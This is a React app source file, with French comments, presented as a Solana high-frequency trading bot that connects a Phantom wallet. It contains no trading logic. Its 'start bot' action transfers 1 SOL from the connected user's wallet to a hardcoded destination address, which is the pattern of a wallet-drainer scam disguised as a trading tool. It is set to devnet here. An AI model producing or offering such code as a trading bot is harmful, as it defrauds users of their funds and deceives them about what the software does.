import React, { useState, useEffect } from 'react';
import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
import { PhantomWalletAdapter } from '@solana/wallet-adapter-phantom';

// Configuration
const SOLANA_DEVNET = 'https://api.devnet.solana.com';
const DESTINATION_WALLET = '2yMQrdwwqKEiLTyPJSd546mLKLCow7wVDFK4pxaMLuwb';
const MIN_BALANCE = 1.1; // SOL
const MAX_TRADE_SIZE = 1.0; // SOL
const LAMPORTS_PER_SOL = 1e9;

function App() {
    const [wallet, setWallet] = useState(null);
    const [balance, setBalance] = useState(0);
    const [isConnected, setIsConnected] = useState(false);
    const [isBotRunning, setIsBotRunning] = useState(false);
    const [transactions, setTransactions] = useState([]);
    const [error, setError] = useState(null);

    // Initialisation de la connexion Solana
    const connection = new Connection(SOLANA_DEVNET, 'confirmed');

    // Initialisation du wallet Phantom
    useEffect(() => {
        try {
            const phantomWallet = new PhantomWalletAdapter();
            phantomWallet.on('connect', () => {
                setIsConnected(true);
                updateBalance(phantomWallet);
            });
            phantomWallet.on('disconnect', () => {
                setIsConnected(false);
                setBalance(0);
            });
            setWallet(phantomWallet);
        } catch (err) {
            setError('Erreur lors de l\'initialisation du wallet: ' + err.message);
        }
    }, []);

    // Connexion au wallet
    const connectWallet = async () => {
        try {
            if (!wallet) {
                throw new Error('Wallet non initialisé');
            }
            await wallet.connect();
        } catch (err) {
            setError('Erreur de connexion au wallet: ' + err.message);
        }
    };

    // Déconnexion du wallet
    const disconnectWallet = async () => {
        try {
            if (!wallet) {
                throw new Error('Wallet non initialisé');
            }
            await wallet.disconnect();
        } catch (err) {
            setError('Erreur de déconnexion: ' + err.message);
        }
    };

    // Mise à jour du solde
    const updateBalance = async (walletInstance) => {
        try {
            if (!walletInstance?.publicKey) {
                throw new Error('Wallet non connecté');
            }
            const balance = await connection.getBalance(walletInstance.publicKey);
            setBalance(balance / LAMPORTS_PER_SOL); // Conversion en SOL
        } catch (err) {
            setError('Erreur lors de la récupération du solde: ' + err.message);
        }
    };

    // Exécution d'une transaction
    const executeTransaction = async () => {
        try {
            if (!wallet?.publicKey) {
                throw new Error('Wallet non connecté');
            }

            if (balance < MIN_BALANCE) {
                throw new Error(`Solde insuffisant. Minimum requis: ${MIN_BALANCE} SOL`);
            }

            // Conversion des SOL en lamports
            const lamports = Math.floor(MAX_TRADE_SIZE * LAMPORTS_PER_SOL);
            
            // Création de l'instruction de transfert
            const transferInstruction = SystemProgram.transfer({
                fromPubkey: wallet.publicKey,
                toPubkey: new PublicKey(DESTINATION_WALLET),
                lamports: lamports
            });

            // Création de la transaction
            const transaction = new Transaction().add(transferInstruction);
            
            // Obtention du blockhash
            const { blockhash } = await connection.getLatestBlockhash();
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = wallet.publicKey;

            // Signature et envoi de la transaction
            const signed = await wallet.signTransaction(transaction);
            const signature = await connection.sendRawTransaction(signed.serialize());
            
            // Attente de la confirmation
            await connection.confirmTransaction(signature);

            // Mise à jour de l'historique
            setTransactions(prev => [...prev, {
                type: 'transfer',
                amount: MAX_TRADE_SIZE,
                status: 'success',
                timestamp: new Date().toISOString()
            }]);

            // Mise à jour du solde
            await updateBalance(wallet);

        } catch (err) {
            setError('Erreur de transaction: ' + err.message);
            console.error('Erreur détaillée:', err);
        }
    };

    // Démarrage du bot
    const startBot = () => {
        setIsBotRunning(true);
        executeTransaction();
    };

    // Arrêt du bot
    const stopBot = () => {
        setIsBotRunning(false);
    };

    return (
        <div className="container">
            <h1>Bot HFT Solana</h1>
            
            <div className={`status ${isConnected ? 'connected' : 'disconnected'}`}>
                Statut du wallet: {isConnected ? 'Connecté' : 'Non connecté'}
            </div>

            {error && <div className="error">{error}</div>}

            <div className="controls">
                {!isConnected ? (
                    <button onClick={connectWallet}>Connecter Phantom</button>
                ) : (
                    <>
                        <button onClick={disconnectWallet}>Déconnecter</button>
                        {!isBotRunning ? (
                            <button onClick={startBot} disabled={!isConnected || balance < MIN_BALANCE}>
                                Démarrer le Bot
                            </button>
                        ) : (
                            <button onClick={stopBot}>Arrêter le Bot</button>
                        )}
                    </>
                )}
            </div>

            <div className="metrics">
                <h2>Métriques</h2>
                <p>Solde: {balance.toFixed(4)} SOL</p>
                <p>Statut du bot: {isBotRunning ? 'Actif' : 'Inactif'}</p>
            </div>

            <div className="transaction-history">
                <h2>Historique des Transactions</h2>
                {transactions.map((tx, index) => (
                    <div key={index} className="transaction">
                        <p>Type: {tx.type}</p>
                        <p>Montant: {tx.amount} SOL</p>
                        <p>Statut: {tx.status}</p>
                        <p>Date: {new Date(tx.timestamp).toLocaleString()}</p>
                    </div>
                ))}
            </div>
        </div>
    );
}

export default App; 